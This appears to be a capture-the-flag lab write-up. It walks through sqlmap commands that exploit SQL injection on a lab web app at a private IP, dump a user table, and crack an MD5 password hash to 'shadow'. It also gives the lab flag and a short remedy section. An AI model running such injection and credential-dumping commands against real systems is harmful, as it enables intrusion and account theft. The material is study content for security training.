# Brute_Force
Brute Force for who, brute force for what, we don't need brute force. What we do need on the other hand is use sqlmap and get usernames and passwords.

## Example
This parts highlights a really nice sqlpmap feature. Throught same means we can be able to retrieve a table in the database that has all the usernames and their passwords. Sqlmap decrypts the passwords for us(Brute Force).

## Commands
sqlmap  -u "http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#"
sqlmap  -u "http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#" --dbs
sqlmap  -u "http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#" --tables -D Member_Brute_Force
sqlmap  -u "http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#" --columns -D Member_Brute_Force -T db_default
sqlmap  -u "http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#" --dump -D Member_Brute_Force -T db_default
    options [Y, Y, D, N];

usernames with cracked passwords
+----+----------+-------------------------------------------+
| id | username | password                                  |
+----+----------+-------------------------------------------+
| 1  | root     | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) |
| 2  | admin    | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) |
+----+----------+-------------------------------------------+
If we login using these in http://192.168.43.251/index.php?page=signin we get our flag: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2

## Remedy
1. Again preapred statements would have prevented us form getting this sort of information
2. However a much stronger ecryptiion model other than md5 five which is really unsafe, would have made it harder to decryt these passwords :\.

# Resources
    https://www.youtube.com/watch?v=ciNHn38EyRc